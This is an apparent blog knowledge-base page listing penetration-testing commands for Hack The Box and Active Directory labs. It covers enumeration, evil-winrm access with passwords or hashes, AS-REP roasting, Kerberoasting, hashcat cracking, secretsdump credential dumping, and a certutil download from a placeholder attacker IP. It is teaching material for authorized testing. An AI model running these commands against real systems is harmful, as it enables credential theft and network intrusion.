+++
date = '2026-08-03'
draft = false
title = 'KB - Command Reference'
description = 'MidwestSec Knowledge Base article containing commonly used penetration testing commands.'
toc = true
tags = [
  "KB",
  "Command Reference",
  "Penetration Testing",
  "Active Directory",
  "Windows"
]
+++

# KB - Command Reference

## Overview

Welcome to the MidwestSec **Knowledge Base (KB)**.

This KB article serves as a central reference for commands that I frequently use throughout my Hack The Box walkthroughs and Active Directory labs. Rather than searching through multiple walkthroughs, this page provides a single location for the commands I use most often.

As additional walkthroughs are published, this KB article will continue to grow with new commands, techniques, and examples.

All examples assume you are working in an authorized lab or penetration testing environment.

---

# Enumeration

## Nmap

```bash
nmap -A -p- -T4 [IP]
```

Example:

```bash
nmap -A -p- -T4 10.129.1.45
```

---

## SMB

List shares:

```bash
smbclient -L \\\\[IP]
```

Connect:

```bash
smbclient \\\\[IP]\\[SHARE]
```

---

## Active Directory

Collect BloodHound data:

```bash
bloodhound-python -d [DOMAIN] -u [USER] -p [PASSWORD] -ns [DC IP] -c ALL
```

---

## WinRM

Password:

```bash
evil-winrm -i [IP] -u [USER] -p [PASSWORD]
```

Hash:

```bash
evil-winrm -i [IP] -u [USER] -H [HASH]
```

Certificate:

```bash
evil-winrm -i [IP] -S -c certificate.pem -k private-key.pem
```

---

## Credential Attacks

AS-REP Roast

```bash
netexec ldap [DC IP] -u users.txt -p '' --asreproast hashes.txt --kdcHost [DC IP]
```

Kerberoast

```bash
GetUserSPNs.py [DOMAIN]/[USER]:[PASSWORD] -dc-ip [DC IP] -request
```

Hashcat

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## File Transfer

```bash
python3 -m http.server 80
```

```bash
impacket-smbserver share . -smb2support
```

```powershell
certutil -urlcache -f http://[ATTACKER IP]/SharpHound.exe SharpHound.exe
```

---

## Quick Reference

```bash
nmap -A -p- -T4 [IP]
enum4linux -a [IP]
smbclient -L \\\\[IP]
bloodhound-python -d [DOMAIN] -u [USER] -p [PASSWORD] -ns [DC IP] -c ALL
evil-winrm -i [IP] -u [USER] -p [PASSWORD]
impacket-secretsdump [DOMAIN]/[USER]:[PASSWORD]@[DC IP]
```

## About this KB

This article is part of the MidwestSec **Knowledge Base (KB)**.

Future KB articles will include:

- Active Directory
- BloodHound
- PowerShell
- Windows
- Linux
- Networking
- Tool-specific references
- Cheatsheets
- Methodologies
